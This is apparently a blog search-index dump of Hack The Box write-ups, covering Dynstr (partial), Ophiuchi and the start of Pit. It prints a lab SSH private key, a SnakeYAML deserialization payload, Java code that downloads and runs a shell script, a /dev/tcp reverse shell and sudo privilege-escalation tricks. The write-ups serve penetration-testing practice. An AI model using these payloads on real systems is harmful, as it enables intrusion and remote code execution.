KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\n-----END OPENSSH PRIVATE KEY-----\\n\u0026#34;, 4096) = 1823 www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep \u0026#34;PRIVATE KEY\u0026#34; strace-C62796521.txt | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 | sed \u0026#39;s/\\\\n/\\n/g\u0026#39; -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1 42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3 HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk +JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs 4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5 rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ== -----END OPENSSH PRIVATE KEY----- But we still need to connect from *.infra.dyna.htb So we have to update dns We can\u0026rsquo;t update resolv.conf We can\u0026rsquo;t update using nsupdate Let\u0026rsquo;s check /etc/bind www-data@dynstr:/dev/shm$ ls -lha /etc/bind total 68K drwxr-sr-x 3 root bind 4.0K Mar 20 2021 . drwxr-xr-x 80 root root 4.0K Jun 8 2021 .. -rw-r--r-- 1 root root 2.0K Feb 18 2021 bind.keys -rw-r--r-- 1 root root 237 Dec 17 2019 db.0 -rw-r--r-- 1 root root 271 Dec 17 2019 db.127 -rw-r--r-- 1 root root 237 Dec 17 2019 db.255 -rw-r--r-- 1 root root 353 Dec 17 2019 db.empty -rw-r--r-- 1 root root 270 Dec 17 2019 db.local -rw-r--r-- 1 root bind 100 Mar 15 2021 ddns.key -rw-r--r-- 1 root bind 101 Mar 15 2021 infra.key drwxr-sr-x 2 root bind 4.0K Mar 15 2021 named.bindmgr -rw-r--r-- 1 root bind 463 Dec 17 2019 named.conf -rw-r--r-- 1 root bind 498 Dec 17 2019 named.conf.default-zones -rw-r--r-- 1 root bind 969 Mar 15 2021 named.conf.local -rw-r--r-- 1 root bind 895 Mar 15 2021 named.conf.options -rw-r----- 1 bind bind 100 Mar 15 2021 rndc.key -rw-r--r-- 1 root root 1.3K Dec 17 2019 zones.rfc1918 We have a infra.key Let\u0026rsquo;s grep it www-data@dynstr:/etc/bind$ grep -r \u0026#39;infra.key\u0026#39; . ./named.conf.local:include \u0026#34;/etc/bind/infra.key\u0026#34;; ./named.conf.local:zone \u0026#34;dyna.htb\u0026#34; IN { type master; file \u0026#34;dyna.htb.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; ./named.conf.local:zone \u0026#34;10.in-addr.arpa\u0026#34; IN { type master; file \u0026#34;10.in-addr.arpa.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; ./named.conf.local:zone \u0026#34;168.192.in-addr.arpa\u0026#34; IN { type master; file \u0026#34;168.192.in-addr.arpa.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; It says that we can update dyna.htb using infra-key And we can read it Update it using nsupdate www-data@dynstr:/etc/bind$ nsupdate -k infra.key \u0026gt; server 127.0.0.1 \u0026gt; zone dyna.htb \u0026gt; update add pentest.infra.dyna.htb 10 A 10.10.16.4 \u0026gt; send \u0026gt; zone 10.in-addr.arpa \u0026gt; update add 4.16.10.10.in-addr.arpa 10 PTR pentest.infra.dyna.htb \u0026gt; send \u0026gt; And now we can ssh using the key └─$ ssh bindmgr@10.10.10.244 -i id_rsa Warning: Permanently added \u0026#39;10.10.10.244\u0026#39; (ED25519) to the list of known hosts. Last login: Tue Jun 8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb bindmgr@dynstr:~$ Root sudo bindmgr@dynstr:~$ sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bindmgr may run the following commands on dynstr: (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh bindmgr@dynstr:~$ ls -lha /usr/local/bin/bindmgr.sh -rwxr-xr-x 1 root root 2.2K Mar 15 2021 /usr/local/bin/bindmgr.sh We can only execute it But it returns error bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr. [-] ERROR: Check versioning. Exiting. bindmgr@dynstr:~$ $? 42: command not found Content bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh #!/usr/bin/bash # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr. # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the list of files to be included # from the source directory they won\u0026#39;t be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed \u0026#39;s/^/ /\u0026#39;; } # Check versioning (.version) echo \u0026#34;[+] Running $0 to stage new configuration from $PWD.\u0026#34; if [[ ! -f .version ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 42 fi if [[ \u0026#34;`cat .version 2\u0026gt;/dev/null`\u0026#34; -le \u0026#34;`cat $BINDMGR_DIR/.version 2\u0026gt;/dev/null`\u0026#34; ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 43 fi # Create config file that includes all files from named.bindmgr. echo \u0026#34;[+] Creating $BINDMGR_CONF file.\u0026#34; printf \u0026#39;// Automatically generated file. Do not modify manually.\\n\u0026#39; \u0026gt; $BINDMGR_CONF for file in * ; do printf \u0026#39;include \u0026#34;/etc/bind/named.bindmgr/%s\u0026#34;;\\n\u0026#39; \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; $BINDMGR_CONF done # Stage new version of configuration files. echo \u0026#34;[+] Staging files to $BINDMGR_DIR.\u0026#34; cp .version * /etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo \u0026#34;[+] Checking staged configuration.\u0026#34; named-checkconf $BINDMGR_CONF \u0026gt;/dev/null if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: \u0026#34; named-checkconf $BINDMGR_CONF 2\u0026gt;\u0026amp;1 | indent exit 44 else echo \u0026#34;[+] Configuration successfully staged.\u0026#34; # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] Restart of bind9 via systemctl failed. Please check logfile: \u0026#34; systemctl status bind9 else echo \u0026#34;[+] Restart of bind9 via systemctl succeeded.\u0026#34; fi fi We have to have a .version file in local directory (Since we received 42 when executed) The vulnerable line is cp .version * /etc/bind/named.bindmgr/ From man page we see that we can use --preserve preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, all bindmgr@dynstr:/dev/shm$ cp /bin/bash . bindmgr@dynstr:/dev/shm$ chmod 4777 bash bindmgr@dynstr:/dev/shm$ ls -lha total 1.2M drwxrwxrwt 2 root root 80 Nov 5 21:06 . drwxr-xr-x 17 root root 3.9K Nov 5 17:33 .. -rwsrwxrwx 1 bindmgr bindmgr 1.2M Nov 5 21:06 bash -rw------- 1 www-data www-data 1.8K Nov 5 20:06 id_rsa bindmgr@dynstr:/dev/shm$ touch -- --preserve=mode bindmgr@dynstr:/dev/shm$ ls -lha total 1.2M drwxrwxrwt 2 root root 100 Nov 5 21:07 . drwxr-xr-x 17 root root 3.9K Nov 5 17:33 .. -rwsrwxrwx 1 bindmgr bindmgr 1.2M Nov 5 21:06 bash -rw------- 1 www-data www-data 1.8K Nov 5 20:06 id_rsa -rw-rw-r-- 1 bindmgr bindmgr 0 Nov 5 21:07 \u0026#39;--preserve=mode\u0026#39; bindmgr@dynstr:/dev/shm$ echo 10 \u0026gt; .version bindmgr@dynstr:/dev/shm$ ls -lha total 1.2M drwxrwxrwt 2 root root 120 Nov 5 21:09 . drwxr-xr-x 17 root root 3.9K Nov 5 17:33 .. -rwsrwxrwx 1 bindmgr bindmgr 1.2M Nov 5 21:06 bash -rw------- 1 www-data www-data 1.8K Nov 5 20:06 id_rsa -rw-rw-r-- 1 bindmgr bindmgr 0 Nov 5 21:07 \u0026#39;--preserve=mode\u0026#39; -rw-rw-r-- 1 bindmgr bindmgr 3 Nov 5 21:09 .version Now everything is ready Run the script bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.bindmgr/bash:1: unknown option \u0026#39;ELF...\u0026#39; /etc/bind/named.bindmgr/bash:14: unknown option \u0026#39;h�ȀE�\u0026#39; /etc/bind/named.bindmgr/bash:40: unknown option \u0026#39;�YF\u0026#39; /etc/bind/named.bindmgr/bash:40: unexpected token near \u0026#39;}\u0026#39; We receive errors But if we check the folder, we have a bash file owned by root with suid bit set Run it with -p and get the flag bindmgr@dynstr:/dev/shm$ ls -lha /etc/bind/named.bindmgr/ total 1.2M drwxr-sr-x 2 root bind 4.0K Nov 5 21:09 . drwxr-sr-x 3 root bind 4.0K Nov 5 21:09 .. -rwsrwxrwx 1 root bind 1.2M Nov 5 21:09 bash -rw------- 1 root bind 1.8K Nov 5 21:09 id_rsa -rw-rw-r-- 1 root bind 3 Nov 5 21:09 .version bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p bash-5.0# whoami root ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/dynstr/images/dynstr.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/dynstr/","summary":"Dynstr Enumeration nmap └─$ nmap -Pn -p- 10.10.10.244 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:36 GMT Stats: 0:06:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 26.60% done; ETC: 17:02 (0:18:43 remaining) Stats: 0:19:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 96.71% done; ETC: 16:57 (0:00:40 remaining) Nmap scan report for 10.10.10.244 (10.10.10.244) Host is up (0.","tags":["HTB","dynamic-dns","no-ip","dnsenum","command-injection","injection","cyberchef","scriptreplay","dns","nsupdate","authorized-keys","wildcard","php","bash","passwd","cp"],"title":"[HTB] Machine: Dynstr"},{"categories":null,"contents":"Ophiuchi Enumeration nmap └─$ nmap -Pn -p- 10.10.10.227 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 17:00 GMT Warning: 10.10.10.227 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.18s latency). Not shown: 63651 closed tcp ports (conn-refused), 1882 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 123.04 seconds └─$ nmap -Pn -p22,8080 -sC -sV 10.10.10.227 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 17:04 GMT Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA) | 256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA) |_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519) 8080/tcp open http Apache Tomcat 9.0.38 |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.68 seconds Web Server goubster └─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.227:8080/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,js,php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /test (Status: 302) [Size: 0] [--\u0026gt; /test/] /manager (Status: 302) [Size: 0] [--\u0026gt; /manager/] Foothold It\u0026rsquo;s a tomcat Default creds didn\u0026rsquo;t work Let\u0026rsquo;s play with YAML Parser Entering plain text results in message Yamls usually get deserialized Since it\u0026rsquo;s a tomcat, we have to google for java yaml deserialization exploit/attack https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://attacker-ip/\u0026#34;] ]] ] If we send the payload, it actually works The blog contains repo for rce \u0026lt;SNIP\u0026gt; public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\u0026#34;ping -c 1 10.10.16.4\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } \u0026lt;SNIP\u0026gt; I had java 17 on my box, which is not supported by the box The payload will break and result in 500 error So compile the project using java 11 └─$ javac src/artsploit/AwesomeScriptEngineFactory.java --release 11 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true └─$ jar -cvf yaml-payload.jar -C src/ . Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true added manifest ignoring entry META-INF/ adding: META-INF/services/(in = 0) (out= 0)(stored 0%) adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%) adding: artsploit/(in = 0) (out= 0)(stored 0%) adding: artsploit/AwesomeScriptEngineFactory.class(in = 1607) (out= 677)(deflated 57%) adding: artsploit/AwesomeScriptEngineFactory.java(in = 1480) (out= 391)(deflated 73%) Send the payload and we see our ping To get a reverse shell we have to create a shell script which will be downloaded and then executed from the box Because nc connections were not stable #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1 \u0026lt;SNIP\u0026gt; public AwesomeScriptEngineFactory() throws Exception { try { Process p = Runtime.getRuntime().exec(\u0026#34;wget 10.10.16.4/shell.sh -O /dev/shm/shell.sh\u0026#34;); p.waitFor(); Process p = Runtime.getRuntime().exec(\u0026#34;chmod +x /dev/shm/shell.sh\u0026#34;); p.waitFor(); Process p = Runtime.getRuntime().exec(\u0026#34;/dev/shm/shell.sh\u0026#34;); p.waitFor(); } catch (IOException e) { e.printStackTrace(); } } \u0026lt;SNIP\u0026gt; User We can start with tomcat\u0026rsquo;s tomcat-users.xml It contains admin creds \u0026lt;SNIP\u0026gt; \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;whythereisalimit\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; \u0026lt;SNIP\u0026gt; And the password is reused tomcat@ophiuchi:/$ su - admin Password: admin@ophiuchi:~$ Root sudo admin@ophiuchi:~$ sudo -l Matching Defaults entries for admin on ophiuchi: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User admin may run the following commands on ophiuchi: (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go index.go admin@ophiuchi:~$ cat /opt/wasm-functions/index.go package main import ( \u0026#34;fmt\u0026#34; wasm \u0026#34;github.com/wasmerio/wasmer-go/wasmer\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;log\u0026#34; ) func main() { bytes, _ := wasm.ReadBytes(\u0026#34;main.wasm\u0026#34;) instance, _ := wasm.NewInstance(bytes) defer instance.Close() init := instance.Exports[\u0026#34;info\u0026#34;] result,_ := init() f := result.String() if (f != \u0026#34;1\u0026#34;) { fmt.Println(\u0026#34;Not ready to deploy\u0026#34;) } else { fmt.Println(\u0026#34;Ready to deploy\u0026#34;) out, err := exec.Command(\u0026#34;/bin/sh\u0026#34;, \u0026#34;deploy.sh\u0026#34;).Output() if err != nil { log.Fatal(err) } fmt.Println(string(out)) } } admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh #!/bin/bash # ToDo # Create script to automatic deploy our new web at tomcat port 8080 We can notice right away that index.go does not use absolute path So we can abuse it We have to create our own main.wasm and deploy.sh If we try to run sudo /usr/bin/go run /opt/wasm-functions/index.go, it will won\u0026rsquo;t work due to errors Let\u0026rsquo;s reverse main.asm using wabt └─$ wasm-decompile main.wasm export memory memory(initial: 16, max: 0); global g_a:int = 1048576; export global data_end:int = 1048576; export global heap_base:int = 1048576; table T_a:funcref(min: 1, max: 1); export function info():int { return 0 } The function info returns 0. Let\u0026rsquo;s create a wasm file using WasmFiddle We have to change return value to 1, since there is a check in index.go Click Build and then download wasm file Now upload to box and run sudo /usr/bin/go run /opt/wasm-functions/index.go from folder where our deploy.sh and main.wasm are located admin@ophiuchi:/dev/shm$ ls -lha total 12K drwxrwxrwt 2 root root 100 Nov 3 20:20 . drwxr-xr-x 17 root root 3.9K Nov 3 15:36 .. -rw-rw-r-- 1 admin admin 58 Nov 3 20:20 deploy.sh -rw-rw-r-- 1 admin admin 92 Nov 3 20:17 main.wasm -rwxr-x--- 1 tomcat tomcat 58 Nov 3 18:23 shell.sh #!/bin/bash /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1\u0026#39; admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/ophiuchi.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/","summary":"Ophiuchi Enumeration nmap └─$ nmap -Pn -p- 10.10.10.227 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 17:00 GMT Warning: 10.10.10.227 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.18s latency). Not shown: 63651 closed tcp ports (conn-refused), 1882 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 123.","tags":["HTB","yaml","tomcat","java","jar","deserialization","marshalsec","yaml-payload","wasm","wasm-fiddle","webassembly"],"title":"[HTB] Machine: Ophiuchi"},{"categories":null,"contents":"Pit Enumeration nmap └─$ nmap -p- 10.10.10.241 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 19:04 GMT Host is up (3.4s latency). Not shown: 63975 filtered tcp ports (no-response), 1557 filtered tcp ports (host-unreach) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9090/tcp open zeus-admin Nmap done: 1 IP address (1 host up) scanned in 1608.36 seconds └─$ nmap -p22,80,9090 -sC -sV 10.10.10.241 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 19:32 GMT Nmap scan report for 10.10.10.241 (10.10.10.241) Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA) | 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA) |_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519) 80/tcp open http nginx 1.14.1 |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux |_http-server-header: nginx/1.14.1 9090/tcp open ssl/zeus-admin? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 400 Bad request | Content-Type: text/html; charset=utf8 | Transfer-Encoding: chunked | X-DNS-Prefetch-Control: off | Referrer-Policy: no-referrer | X-Content-Type-Options: nosniff | Cross-Origin-Resource-Policy: same-origin | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt; | request | \u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;style\u0026gt; | body { | margin: 0; | font-family: \u0026#34;RedHatDisplay\u0026#34;, \u0026#34;Open Sans\u0026#34;, Helvetica, Arial, sans-serif; | font-size: 12px; | line-height: 1.66666667; | color: #333333; | background-color: #f5f5f5; | border: 0; | vertical-align: middle; | font-weight: 300; |_ margin: 0 0 10p | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1 | Not valid before: 2020-04-16T23:29:12 |_Not valid after: 2030-06-04T16:09:12 |_ssl-date: TLS randomness does not represent time 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9090-TCP:V=7.94%T=SSL%I=7%D=11/4%Time=65469C95%P=x86_64-pc-linux-gn SF:u%r(GetRequest,E70,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20request\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-Encoding:\\x20chunked\\r\\nX-DN SF:S-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\x20no-referrer\\r\\nX-Cont SF:ent-Type-Options:\\x20nosniff\\r\\nCross-Origin-Resource-Policy:\\x20same-o SF:rigin\\r\\n\\r\\n29\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;title\u0026gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;met SF:a\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;text/html;\\x20charset=utf 